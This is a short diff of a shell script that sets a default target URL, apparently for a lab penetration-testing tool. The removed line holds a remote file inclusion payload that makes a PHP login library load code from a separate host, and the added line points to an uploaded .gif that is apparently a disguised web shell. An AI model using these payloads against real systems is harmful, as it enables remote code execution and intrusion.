@@ -2,7 +2,7 @@
 #http://10.10.10.67/webdav_test_inception/s.php
 
 if [ $1='' ]; then
-	url='http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111//slogin_lib.inc.php?slogin_path=http://10.11.0.245/rfi.php'
+	url='http://192.168.2.141/upload/d885dd019005c7d0a804e017ddb7c3c9.gif'
 else 
 	url=$1
 fi
